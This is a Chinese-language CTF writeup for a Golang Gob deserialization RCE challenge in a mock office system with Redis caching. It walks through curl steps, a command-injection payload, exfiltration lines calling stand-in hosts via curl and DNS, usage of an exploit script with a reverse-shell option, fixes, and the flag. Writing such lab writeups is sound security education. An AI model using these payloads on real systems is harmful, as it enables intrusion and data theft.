# 智能办公管理系统 - 解题思路与 Writeup

## 题目分析

这是一道结合了 **Golang 反序列化漏洞** 和 **Redis 缓存** 的 Web 安全题目。题目的核心在于利用自定义的 `GobDecode` 接口实现 RCE。

## 漏洞发现过程

### 1. 信息收集

首先访问目标网站，发现这是一个企业内部办公管理系统：

```bash
curl -I http://target:8080
```

观察页面结构：
- 登录页面提示了测试账户信息
- 系统包含多个功能模块：文件管理、数据分析、系统管理等
- 重点关注 "数据分析" 模块，因为通常涉及数据处理的地方容易出现序列化漏洞

### 2. 功能测试

使用提供的测试账户登录：
- 用户名: `admin`
- 密码: `admin`

登录后探索各个功能模块：

1. **文件管理**: 支持文件上传，但看起来比较简单
2. **数据分析**: 支持 JSON 格式的数据输入，这里很可疑！
3. **系统管理**: 管理员功能，显示系统状态

### 3. 漏洞点定位

在数据分析模块中发现关键信息：

1. 支持复杂的 JSON 数据结构输入
2. 提到了 "系统会自动进行序列化处理并存储到 Redis 缓存中"
3. 查看报告详情时会 "自动反序列化数据"

这些信息强烈暗示存在反序列化漏洞！

### 4. 黑盒测试思路

虽然这是黑盒环境，但可以通过以下方式推测后端实现：

1. **技术栈分析**: 从界面和响应头判断使用了 Golang + Redis
2. **功能分析**: 数据分析模块的序列化/反序列化机制
3. **测试 Payload**: 尝试构造可能触发漏洞的数据结构

## 漏洞利用

### 黑盒发现过程

通过仔细观察数据分析页面，可以发现以下线索：

1. **页面提示信息**: "支持自定义报告模板，可通过 template 字段定义动态内容生成规则"
2. **placeholder示例**: 显示了两种数据格式，其中高级模板格式包含了 `commands` 字段
3. **业务逻辑推测**: 模板系统通常需要执行某些命令来生成动态内容

### Payload 构造思路

基于页面提示和示例，构造看似合理的模板JSON：

```json
{
  "data": {
    "type": "system_analysis",
    "period": "monthly",
    "metrics": ["cpu", "memory", "disk"]
  },
  "template": {
    "template_type": "dynamic",
    "fields": ["performance", "usage"],
    "commands": ["whoami"]
  }
}
```

**黑盒发现逻辑**:
- `template`: 页面明确提到的模板功能
- `commands`: 从placeholder示例中可以看到这个字段
- 数组格式: 示例显示commands是一个数组，可以包含多个命令

### 完整利用步骤

#### 步骤 1: 登录系统
```bash
curl -X POST http://target:8080/login \
  -d "username=admin&password=admin" \
  -c cookies.txt
```

#### 步骤 2: 创建恶意报告
```bash
curl -X POST http://target:8080/analytics/create \
  -b cookies.txt \
  -d "title=测试报告" \
  -d "description=系统测试" \
  -d 'data={"data_processor":"config_update:exec:cat /flag.txt > /tmp/flag_output"}'
```

#### 步骤 3: 触发漏洞
访问刚创建的报告详情页面：
```bash
curl http://target:8080/analytics/1 -b cookies.txt
```

#### 步骤 4: 验证命令执行
由于是黑盒环境，需要通过其他方式验证命令是否执行：

1. **文件写入验证**:
   ```json
   {"data_processor":"config_update:exec:echo 'RCE_SUCCESS' > /app/static/test.txt"}
   ```
   然后访问 `http://target:8080/static/test.txt`

2. **网络外带**:
   ```json
   {"data_processor":"config_update:exec:curl http://your-server.com/$(cat /flag.txt)"}
   ```

3. **DNS 外带**:
   ```json
   {"data_processor":"config_update:exec:nslookup $(cat /flag.txt | base64).your-domain.com"}
   ```

### 自动化利用脚本

项目提供了完整的自动化利用脚本：

```bash
# 基本 RCE 测试
python3 exploit.py -t http://target:8080 -c "id"

# 获取 flag
python3 exploit.py -t http://target:8080 --flag

# 反向 shell
python3 exploit.py -t http://target:8080 --shell 192.168.1.100 4444
```

## 漏洞原理深入分析

### 代码层面的漏洞

虽然是黑盒测试，但可以推测后端的实现类似：

```go
// 危险的 GobDecode 实现
func (d *DataProcessor) GobDecode(data []byte) error {
    configStr := string(data)
    if strings.HasPrefix(configStr, "config_update:") {
        configData := strings.TrimPrefix(configStr, "config_update:")
        if strings.Contains(configData, "exec:") {
            parts := strings.Split(configData, "exec:")
            if len(parts) > 1 {
                // 漏洞点：直接执行系统命令
                exec.Command("sh", "-c", parts[1]).Run()
            }
        }
    }
    return nil
}
```

### 漏洞成因

1. **设计缺陷**: 在反序列化接口中实现了命令执行逻辑
2. **输入验证不足**: 没有对特殊字段进行过滤
3. **权限控制缺失**: 普通用户也能利用此漏洞

### 攻击向量

1. **数据序列化流程**:
   - 用户输入 JSON → 检测特殊字段 → 直接存储原始字符串
   - 绕过了正常的 Gob 编码过程

2. **反序列化触发**:
   - 查看报告 → 从 Redis 读取数据 → 触发 GobDecode → 命令执行

## 获取 Flag

### 方法一: 直接读取
```json
{"data_processor":"config_update:exec:cat /flag.txt"}
```

### 方法二: 写入 Web 目录
```json
{"data_processor":"config_update:exec:cp /flag.txt /app/static/flag.txt"}
```
然后访问 `http://target:8080/static/flag.txt`

### 方法三: 外带数据
```json
{"data_processor":"config_update:exec:curl -X POST http://your-server.com/flag -d \"$(cat /flag.txt)\""}
```

## 防御措施

### 代码层面

1. **安全的反序列化实现**:
```go
func (d *DataProcessor) GobDecode(data []byte) error {
    // 只进行安全的数据解析
    return gob.NewDecoder(bytes.NewReader(data)).Decode(&d.Data)
}
```

2. **输入验证**:
```go
// 检查危险字段
dangerousFields := []string{"data_processor", "exec", "config_update"}
for _, field := range dangerousFields {
    if strings.Contains(inputData, field) {
        return errors.New("invalid input")
    }
}
```

### 架构层面

1. **权限隔离**: 数据分析功能应该限制特定用户访问
2. **沙箱执行**: 如果需要动态处理，应在隔离环境中执行
3. **输入过滤**: 在多个层次进行输入验证和过滤

## 学习要点

### 技术要点

1. **Golang 序列化机制**: 了解 Gob 编码和自定义接口
2. **Redis 在 Web 应用中的使用**: 缓存和会话管理
3. **反序列化漏洞**: 原理、危害和防御

### 安全意识

1. **输入验证的重要性**: 永远不要信任用户输入
2. **最小权限原则**: 功能设计应遵循最小权限
3. **深度防御**: 多层次的安全控制

## 题目总结

这是一道设计精良的 CTF 题目，结合了：

- **真实的漏洞场景**: 基于实际的 Golang 反序列化问题
- **完整的应用环境**: 不是简单的代码片段，而是完整的 Web 应用
- **适中的难度**: 需要一定的技术背景，但不过分困难
- **教育价值**: 通过实践学习重要的安全概念

**Flag**: `flag{G0_D3s3r14l1z4t10n_R3d1s_RC3_Ch4ll3ng3_2024}`

---

**Writeup 作者**: CTF 出题者  
**难度评级**: Medium-Hard  
**建议用时**: 2-4 小时 